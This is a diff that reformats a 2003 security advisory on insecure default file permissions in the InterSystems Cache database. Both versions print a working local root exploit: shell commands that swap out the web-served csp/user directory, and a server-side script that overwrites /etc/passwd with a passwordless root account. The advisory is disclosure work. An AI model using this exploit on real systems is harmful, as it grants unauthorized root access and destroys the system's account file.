@@ -1,48 +1,56 @@
-                                Advisory #: 26
-Title: Cache Database Poor File Permissions Lead To Local Root
-Author:Larry W. Cashdollar, @_larry0
-Date: 2003-03-11
-Download Site: http://www.intersystems.com/our-products/cache/cache-overview/
-Vendor:InterSystems Cache
-Vendor Notified: 2003-03-11
-Vendor Contact: support@intersystems.com
-Description: Cache', the post-relational database for e-applications, is
-optimized for the tougher demands of Web applications. It delivers breakthrough
-performance for massively scalable Web applications. Its rapid application
-development environment with advanced object technology lets you operate at
-Internet speed. Cache's ultra-fast SQL outperforms relational systems 20X. And
-its multidimensional application and data server delivers lightning-fast
-performance.
-Vulnerability:
-The default installation of the Cache database yeilds poorly protected files
-and directories in the main package tree. Directories and files are open to all
-users as read write and execute. Local attackers can exploit this to manipulate
-directories and binaries inside the installation tree. This may be used by a
-local malicious user to gain root access. The content in /cachesys/csp/user is
-executed as root through the web interface. user's parent directory (csp) is
-world writeable allowing a local non root user to move user aside, copy its
-contents and create a new writeable user directory. $ mv /cachesys/csp/user /
-cachesys/csp/user.old $ cp -rp /cachesys/csp/user /cachesys/csp/user.old $ cp
-cspexp.csp /cachesys/csp/user $ lnyx http://localhost/csp/user/cspexp.csp $ su
-- cache
-CVE-2003-0498 2003-0497
-JSON:Export
-Exploit Code:
-   1. Intersystems Cache local root exploit. Larry W. Cashdollar http://
-      vapid.dhs.org
-   2.  
-   3. Because of poor default file and directory permissions a localuser can
-      execute code as root via the cache CSP interpreter. <HR> Attempting to
-      overwrite /etc/passwd with cache::0:0:root:/root:/bin/bash.
-   4. filename ->  cspexp.csp
-   5.  
-   6. <script language=Cache runat=server>
-   7.  
-   8.      Set cdef=##class(%Library.File).%New("/etc/passwd")
-   9.      Do cdef.Open("WSN")
-  10.      Do cdef.WriteLine("cache::0:0:root:/root:/bin/bash")
-  11.      Do cdef.%Close()
-  12. </script>
-Screen Shots:
-Advisory: http://www.vapid.dhs.org/advisories/
-cache_database_file_permissions.html
+
+                               Advisory #: 26
+
+   Title: Cache Database Poor File Permissions Lead To Local Root
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2003-03-11
+   Download Site:
+   http://www.intersystems.com/our-products/cache/cache-overview/
+   Vendor: InterSystems Cache
+   Vendor Notified: 2003-03-11
+   Vendor Contact: support@intersystems.com
+   Description: Cache', the post-relational database for e-applications,
+   is optimized for the tougher demands of Web applications. It delivers
+   breakthrough performance for massively scalable Web applications. Its
+   rapid application development environment with advanced object
+   technology lets you operate at Internet speed. Cache's ultra-fast SQL
+   outperforms relational systems 20X. And its multidimensional
+   application and data server delivers lightning-fast performance.
+   Vulnerability:
+   The default installation of the Cache database yeilds poorly protected
+   files and directories in the main package tree. Directories and files
+   are open to all users as read write and execute. Local attackers can
+   exploit this to manipulate directories and binaries inside the
+   installation tree. This may be used by a local malicious user to gain
+   root access. The content in /cachesys/csp/user is executed as root
+   through the web interface. user's parent directory (csp) is world
+   writeable allowing a local non root user to move user aside, copy its
+   contents and create a new writeable user directory. $ mv
+   /cachesys/csp/user /cachesys/csp/user.old $ cp -rp /cachesys/csp/user
+   /cachesys/csp/user.old $ cp cspexp.csp /cachesys/csp/user $ lnyx
+   http://localhost/csp/user/cspexp.csp $ su - cache
+   CVE-2003-0498 2003-0497
+   JSON: Export
+   Exploit Code:
+
+    1. Intersystems Cache local root exploit. Larry W. Cashdollar
+       http://vapid.dhs.org
+    2.
+    3. Because of poor default file and directory permissions a localuser
+       can execute code as root via the cache CSP interpreter. <HR>
+       Attempting to overwrite /etc/passwd with
+       cache::0:0:root:/root:/bin/bash.
+    4. filename -> cspexp.csp
+    5.
+    6. <script language=Cache runat=server>
+    7.
+    8. Set cdef=##class(%Library.File).%New("/etc/passwd")
+    9. Do cdef.Open("WSN")
+   10. Do cdef.WriteLine("cache::0:0:root:/root:/bin/bash")
+   11. Do cdef.%Close()
+   12. </script>
+
+   Screen Shots:
+   Advisory:
+   http://www.vapid.dhs.org/advisories/cache_database_file_permissions.htm
+   l
